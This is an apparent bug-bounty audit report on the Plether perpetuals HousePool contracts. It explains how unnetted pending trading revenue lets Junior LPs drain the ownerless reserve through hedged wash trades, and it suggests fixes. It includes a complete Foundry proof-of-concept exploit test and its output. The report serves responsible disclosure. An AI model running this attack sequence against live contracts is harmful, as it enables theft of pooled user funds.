# \#99855 [SC-Critical] Gross pending trading revenue is never netted against trader payouts, letting Junior LPs withdraw quarantined `unassignedAssets`

**Submitted on Nov 15th 2026 at 13:46:49 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99855
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# Description

## Brief/Intro

When both stored tranche principals are zero, `HousePool` records every trading receipt in `pendingTradingRevenueAssets`. Trader payouts reduce pool cash but never reduce that bucket. At the next reconciliation, `planReconcile()` reserves the whole gross bucket from distributable NAV *before* it caps `unassignedAssets`. The ownerless reserve therefore absorbs the payouts, and the gross bucket is credited to the tranches.

A Junior holder can exploit this with hedged trades. A LONG and an equal SHORT are opened and closed together. The losing leg's payment enters the pending bucket. The winning leg's equal payout is charged against the reserve. Pool cash barely moves, but the reserve turns into withdrawable Junior principal.

In the PoC, 10 hedged cycles raise pool cash by only **6,967 USDG** but grow pending revenue to **161,039 USDG**. One permissionless settlement then writes the reserve down by **154,071 USDG**. A holder of 50% of Junior shares, who had deposited 5,000 USDG, withdraws **75,519 USDG**. All positions are flat at the settlement checkpoint, and no mark-to-market value is involved.

## Vulnerability Details

Reviewed revision: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Paths are relative to `packages/perps/src`.

### 1. Revenue is queued gross while both principals are zero

[`HousePool.recordClaimantInflow()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651) adds cash and queues the full amount whenever both stored principals are zero:

```solidity
if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
    accountedAssets += amount;
}

if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);
}
```

A losing close is one such inflow. [`CfdEngineSettlementSidecar.sol:604-612`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L604-L612) records the consumed price-loss pledge plus collected action charges as `Revenue / CashArrived`. Positive opening VPI and collected carry reach the same bucket.

### 2. Trader payouts never retire the bucket

[`HousePool.payOut()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L604-L613) only reduces accounted cash and transfers tokens:

```solidity
accountedAssets -= amount;
settlementToken.safeTransfer(recipient, amount);
```

The only live decrement of the bucket is its consumption during reconciliation ([`HousePool.sol:1787-1792`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1787-L1792)). Between two reconciliations, the bucket is therefore the **sum of all receipts**, while pool cash reflects receipts **minus** payouts.

### 3. Reconciliation reserves the gross bucket ahead of the ownerless reserve

[`_reconcile()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599) caps the bucket only against total distributable NAV ([`HousePool.sol:1829-1834`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834)):

```solidity
return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
```

[`HousePoolReconcilePlanLib.planReconcile()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L74) then subtracts the bucket first and caps `unassignedAssets` to what is left:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}

plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

`_reconcile()` stores the reduced reserve, then applies the bucket through [`applyRevenueIntent()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L158-L187). That restores Senior up to its high-water mark and credits the rest to `juniorPrincipal`. Nothing records the reserve shortfall, so it is never restored.

With reserve `U`, gross bucket `R` and payouts `X` since the principals were wiped (flat pool, `R <= distributable`):

```text
pool cash after trading      = U + R - X
reserve after reconciliation = min(U, U + R - X - R) = U - X
tranche credit               = R
```

The payouts are charged to the ownerless reserve, and the gross receipts go to LPs. A correct net ledger gives `unassigned = U` and `tranche credit = R - X`.

### 4. Why this breaks the intended ownership rules

- `INTERNAL_ARCHITECTURE_MAP.md:75` says unassigned assets "Require explicit assignment; cannot silently become windfall LP ownership."
- `ACCOUNTING_SPEC.md:650` says only value with no safe claimant path belongs in `unassignedAssets`. Here the reserve shrinks while pool cash *rises*.
- For ordinary principal, losses hit Junior, then Senior, and only then the reserve. Pending revenue is also claimant-owned value, but it is reserved *ahead* of the ownerless reserve. Losses that follow it therefore skip the LP-owned bucket and land on `unassignedAssets`.
- The project's reference model ([`PerpWaterfallReferenceInvariant.t.sol`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/invariant/properties/PerpWaterfallReferenceInvariant.t.sol)) derives ownership from a net cash ledger. Its handler reconciles after every round trip, so the pending bucket never spans more than one trade. On the PoC's sequence the reference model would leave the reserve untouched, because cash ends above `U`.

### 5. Reachability

Every step is either a documented trusted action or a permissionless public action:

1. **A recap surplus exists.** `CfdEngine.recapitalizePool()` restores Senior to its high-water mark and parks the excess in `unassignedAssets`. The project's own test `test_Reachability_RecapitalizationRestoresSeniorAndReservesSurplusBeforeNewRevenue` asserts that this surplus "remains reserved through later trading revenue". The MED-26 response confirms that trading continues while post-activation ownerless value exists.
2. **The tranches are wiped by a realized loss.** After a recovery recap the tranches are small compared with the reserve. In the PoC, an ordinary 6% trader win on a 400k LONG exceeds the 20k of total principal. Any settlement with a matured request persists the wipe. A full-balance Junior redemption is refunded at zero value, and that counts as progress. Share supplies survive.
3. **The attacker runs hedged pairs while principals are zero.** Each cycle opens a LONG and an equal SHORT and closes both after a price move. The losing leg's payment enters the bucket and the winning leg is paid from pool cash. The trader side nets to zero, minus fees and VPI. The order of the two closes does not matter.
4. **The attacker redeems pre-existing Junior shares.** The request matures one LP epoch later, and anyone can call `OrderRouter.settleLpEpoch()`. The settlement persists the write-down and funds the redemption in the same transaction.

If a third party settles during step 3, the diversion accumulated so far is locked into tranche principal at that point. It is not reversed. The attacker needs price movement but not price control. Each cycle diverts roughly `size × |move|` plus positive VPI and costs about 16 bps of notional in execution fees plus net VPI. In the PoC, each cycle costs the traders about 931 USDG and diverts about 15,400 USDG.

### 6. Relation to known and other issues

- **MED-26 (acknowledged).** It concerns activating trading against ownerless assets, and trader PnL consuming them. Here the traders lose money in aggregate (9,311 USDG). The reserve goes to LP holders through the gross/net ledger mismatch, not to traders.
- **SC-L1 / MED-12 (fixed).** Those fixes cap pending buckets at distributable NAV and keep partial-settlement residuals reserved. In the PoC the whole bucket is settleable and no residual remains. The defect is that the bucket itself is overstated.
- **MED-6 (fixed).** That fix caps protocol-fee top-ups by the pending and unassigned reserves, and this report does not depend on top-ups. Ordinary trader payouts keep their documented priority over those reserves, and this report does not ask for that to change.
- **MED-1 (fixed).** That issue concerns stale-mark consumption of buckets. Every reconciliation here uses a fresh mark.

## Impact Details

**Selected impact: Critical, direct theft of funds.**

USDG reserved as ownerless recapitalization capital is paid out to Junior LPs who have no claim to it. In the PoC:

| Quantity | USDG |
|---|---:|
| Reserve before trading | 976,244 |
| Net pool cash change over 10 hedged cycles | +6,967 |
| `pendingTradingRevenueAssets` before settlement | 161,039 |
| Reserve after one settlement | 822,173 |
| **Reserve written down** | **154,071** |
| Senior restored to its high-water mark | 10,000 |
| Credited to Junior | 151,038 |
| **Attacker payout (50% of Junior, 5,000 deposited)** | **75,519** |
| Hedge traders' aggregate cost | 9,311 |

The attacker nets about 61,000 USDG after its deposit and trading costs. The other Junior holders receive the remaining 75,519 USDG of the diverted reserve.

The loss is permanent. No code path restores the reserve. When governance later calls `assignUnassignedAssets()`, it reconciles first and can assign only the reduced balance. The amount at risk grows with the number of cycles completed before any settlement, up to all of `unassignedAssets`.

Feasibility factors are: a recap surplus coexisting with wiped principals; price moves large enough for each cycle to cover its fees; and the owner not assigning the reserve first. Under the program's Feasibility Limitations, these affect the reward amount, not the impact or severity. The only privileged step is the documented `recapitalizePool()`.

Side effect, not claimed separately: when the gross bucket exceeds distributable NAV, the excess remains as a residual reservation with no cash behind it. It keeps deposit activation deferred.

## Recommendation

Make pending revenue absorb losses before the ownerless reserve does, as ordinary tranche principal already does. Either of these works:

1. **Cap revenue after the reserve.** In `_settleablePendingClaimantBuckets()` / `planReconcile()`, cap `unassignedAssets` against distributable NAV first. Then cap the revenue bucket against `distributable - unassignedAssets`, and write off any revenue in excess of that, since its cash has already left the pool.
2. **Net payouts against the bucket.** While the bucket is nonzero and both principals are zero, reduce `pendingTradingRevenueAssets` by trader payouts and rebates, or record the pool cash at the time revenue first queues and cap the settleable revenue at the net increase since then.

Apply the same change to `_previewPendingAccountingState()` so that previews, cancellation predicates and live settlement stay consistent.

## Proof of Concept

# Proof of Concept

Save as `test/poc/UnnettedPendingRevenueReserveDiversion.t.sol` and run:

```bash
forge test --match-path test/poc/UnnettedPendingRevenueReserveDiversion.t.sol -vv
```

The PoC uses the in-repo `BasePerpTest` harness with the release risk parameters from `packages/perps/DEPLOYMENT.md` (1% VPI factor, 40% skew limit) and the release Senior limits (40M USDG / 80%). It does not modify any in-scope contract. All protocol actions go through public entry points (`requestRedeem`, `recapitalizePool`, `router.commitOrder` / `executeOrder`, `router.settleLpEpoch`, `claimRedeem`).

## Steps

1. Fund Junior (1k seed, attacker 5k, incumbent 4k, Carol 1k) and Senior (1k seed, 9k LP).
2. The owner recapitalizes 980,000 USDG. One settlement parks the full amount in `unassignedAssets`.
3. A trader opens a 400k LONG at $1.00 and closes it at $0.94. The realized gain exceeds total LP principal. The incumbent's full-balance Junior redemption is refunded at zero value, which persists the wipe. Both principals are 0 and share supplies survive.
4. Two hedge traders run 10 cycles: each opens a 300k LONG and a 300k SHORT, then closes both after the price alternates between $1.00 and $0.95. No LP settlement runs in between.
5. The attacker requests redemption of all its Junior shares. After one epoch, a permissionless `router.settleLpEpoch()` reconciles and funds it.

## Output

```text
[PASS] test_Poc_GrossPendingRevenueDivertsUnassignedToJunior()
  unassigned after wipe: 976244094392
  pool cash after wipe: 976244094392
  senior HWM: 10000219202
  pool cash after wash cycles: 983211433967
  pending trading revenue: 161038723373
  stored unassigned (unchanged until reconcile): 976244094392
  aggregate hedge trader cost: 9311339575
  unassigned after settlement: 822172710594
  reserve write-down: 154071383798
  senior principal after: 10000219202
  junior principal after: 75519229105
  pending revenue after: 0
  attacker claimable shares: 5000045660416
  attacker USDG payout (5k historical deposit): 75519275066
```

## Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Verification PoC: with both stored tranche principals at zero, gross losing-trader receipts accumulate in
///         `pendingTradingRevenueAssets` while the paired winner's payout is never netted against it. The next
///         reconciliation reserves the gross bucket ahead of `unassignedAssets`, writes the ownerless reserve down,
///         and credits the bucket to Junior, which a pre-existing Junior holder then withdraws.
contract UnnettedPendingRevenueReserveDiversionPoC is BasePerpTest {

    address private constant SENIOR_LP = address(0x5E1102);
    address private constant INCUMBENT = address(0xA11CE);
    address private constant ATTACKER = address(0xB0B);
    address private constant CAROL = address(0xCA201);
    address private constant WIPER = address(0x3199);
    address private constant HEDGE_LONG = address(0x1001);
    address private constant HEDGE_SHORT = address(0x1002);

    uint256 private constant P_HIGH = 1e8; // $1.00
    uint256 private constant P_LOW = 95_000_000; // $0.95
    uint256 private constant RECAP = 980_000e6;
    uint256 private constant HEDGE_SIZE = 300_000e18;
    uint256 private constant HEDGE_MARGIN = 40_000e6;
    uint256 private constant CYCLES = 10;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        vm.warp(SETUP_TIMESTAMP);
    }

    function test_Poc_GrossPendingRevenueDivertsUnassignedToJunior() public {
        // ---- LP funding: Junior seed 1k + attacker 5k + incumbent 4k + Carol 1k; Senior seed 1k + 9k.
        uint256 attackerShares = _fundJuniorDelayed(ATTACKER, 5_000e6);
        uint256 incumbentShares = _fundJuniorDelayed(INCUMBENT, 4_000e6);
        uint256 carolShares = _fundJuniorDelayed(CAROL, 1_000e6);
        _fundSenior(SENIOR_LP, 9_000e6);

        // ---- Documented owner recapitalization while Senior is unimpaired: surplus parks in unassignedAssets.
        _finishAsyncCooldown(CAROL);
        vm.prank(CAROL);
        uint256 carolEpoch = juniorVault.requestRedeem(carolShares, CAROL, CAROL);
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        vm.warp(pool.lpEpochStart(carolEpoch));
        router.settleLpEpoch(_mockPythUpdateData(P_HIGH));
        uint256 carolClaimable = juniorVault.claimableRedeemRequest(carolEpoch, CAROL);
        vm.prank(CAROL);
        juniorVault.claimRedeem(carolEpoch, carolClaimable, CAROL, CAROL);
        assertEq(pool.unassignedAssets(), RECAP, "recap surplus parked as unassigned");

        // ---- An ordinary realized trader gain slightly above total LP principal wipes both tranches.
        _fundTrader(WIPER, 60_000e6);
        vm.prank(WIPER);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, 400_000e18, 40_000e6, 0, false);
        router.executeOrder(id, _mockPythUpdateData(P_HIGH));
        vm.prank(WIPER);
        id = router.commitOrder(CfdTypes.Side.LONG, 400_000e18, 0, 0, true);
        router.executeOrder(id, _mockPythUpdateData(94_000_000));

        // A full-balance zero-value Junior redemption persists the loss reconciliation (refund counts as progress).
        _finishAsyncCooldown(INCUMBENT);
        vm.prank(INCUMBENT);
        uint256 wipeEpoch = juniorVault.requestRedeem(incumbentShares, INCUMBENT, INCUMBENT);
        vm.warp(pool.lpEpochStart(wipeEpoch));
        router.settleLpEpoch(_mockPythUpdateData(P_HIGH));
        vm.prank(INCUMBENT);
        juniorVault.claimRedeemRefund(wipeEpoch, INCUMBENT, INCUMBENT);

        assertEq(pool.seniorPrincipal(), 0, "senior wiped");
        assertEq(pool.juniorPrincipal(), 0, "junior wiped");
        assertGt(juniorVault.totalSupply(), 0, "junior shares survive");
        uint256 unassignedStart = pool.unassignedAssets();
        uint256 cashStart = pool.totalAssets();
        emit log_named_uint("unassigned after wipe", unassignedStart);
        emit log_named_uint("pool cash after wipe", cashStart);
        emit log_named_uint("senior HWM", pool.seniorHighWaterMark());
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no pending revenue yet");

        // ---- Hedged wash cycles: open LONG + SHORT, close loser first then winner. No LP settlement in between.
        _fundTrader(HEDGE_LONG, 200_000e6);
        _fundTrader(HEDGE_SHORT, 200_000e6);
        uint256 traderFundsStart = clearinghouse.balanceAssets(HEDGE_LONG) + clearinghouse.balanceAssets(HEDGE_SHORT);
        uint256 openPrice = P_HIGH;
        for (uint256 i; i < CYCLES; ++i) {
            uint256 closePrice = openPrice == P_HIGH ? P_LOW : P_HIGH;
            _trade(HEDGE_LONG, CfdTypes.Side.LONG, HEDGE_MARGIN, false, openPrice);
            _trade(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_MARGIN, false, openPrice);
            // Price falls -> LONG wins / SHORT loses; price rises -> SHORT wins / LONG loses.
            bool longWins = closePrice < openPrice;
            if (longWins) {
                _trade(HEDGE_SHORT, CfdTypes.Side.SHORT, 0, true, closePrice);
                _trade(HEDGE_LONG, CfdTypes.Side.LONG, 0, true, closePrice);
            } else {
                _trade(HEDGE_LONG, CfdTypes.Side.LONG, 0, true, closePrice);
                _trade(HEDGE_SHORT, CfdTypes.Side.SHORT, 0, true, closePrice);
            }
            openPrice = closePrice;
        }
        uint256 traderFundsEnd = clearinghouse.balanceAssets(HEDGE_LONG) + clearinghouse.balanceAssets(HEDGE_SHORT);

        uint256 cashEnd = pool.totalAssets();
        uint256 pending = pool.pendingTradingRevenueAssets();
        emit log_named_uint("pool cash after wash cycles", cashEnd);
        emit log_named_uint("pending trading revenue", pending);
        emit log_named_uint("stored unassigned (unchanged until reconcile)", pool.unassignedAssets());
        emit log_named_uint("aggregate hedge trader cost", traderFundsStart - traderFundsEnd);
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "principals still zero");
        assertGe(cashEnd, cashStart, "pool cash did not decrease: net trading result is a small LP gain");
        uint256 netCashGain = cashEnd - cashStart;
        assertGt(pending, 10 * netCashGain, "pending revenue far exceeds the real net cash gain");

        // ---- Attacker exits its pre-existing Junior shares through a normal permissionless settlement.
        _finishAsyncCooldown(ATTACKER);
        vm.prank(ATTACKER);
        uint256 exitEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(exitEpoch));
        router.settleLpEpoch(_mockPythUpdateData(openPrice));
        uint256 claimable = juniorVault.claimableRedeemRequest(exitEpoch, ATTACKER);
        uint256 payout;
        if (claimable > 0) {
            vm.prank(ATTACKER);
            payout = juniorVault.claimRedeem(exitEpoch, claimable, ATTACKER, ATTACKER);
        }

        uint256 unassignedEnd = pool.unassignedAssets();
        emit log_named_uint("unassigned after settlement", unassignedEnd);
        emit log_named_uint("reserve write-down", unassignedStart - unassignedEnd);
        emit log_named_uint("senior principal after", pool.seniorPrincipal());
        emit log_named_uint("junior principal after", pool.juniorPrincipal());
        emit log_named_uint("pending revenue after", pool.pendingTradingRevenueAssets());
        emit log_named_uint("attacker claimable shares", claimable);
        emit log_named_uint("attacker USDG payout (5k historical deposit)", payout);

        // Correct net ledger: pool cash rose by `netCashGain`, so the ownerless reserve should be untouched.
        assertLt(unassignedEnd, unassignedStart - 50_000e6, "reserve written down by >50k despite net cash gain");
        assertGt(payout, 20_000e6, "attacker withdraws far more than its 5k contribution");
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 margin,
        bool isClose,
        uint256 price
    ) private {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(side, HEDGE_SIZE, margin, 0, isClose);
        router.executeOrder(orderId, _mockPythUpdateData(price));
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, isClose ? 0 : HEDGE_SIZE, "order executed");
    }

    function _finishAsyncCooldown(
        address owner
    ) private {
        uint256 unlock = juniorVault.lastDepositTime(owner) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp <= unlock) {
            vm.warp(unlock + 1);
        }
    }

}
```
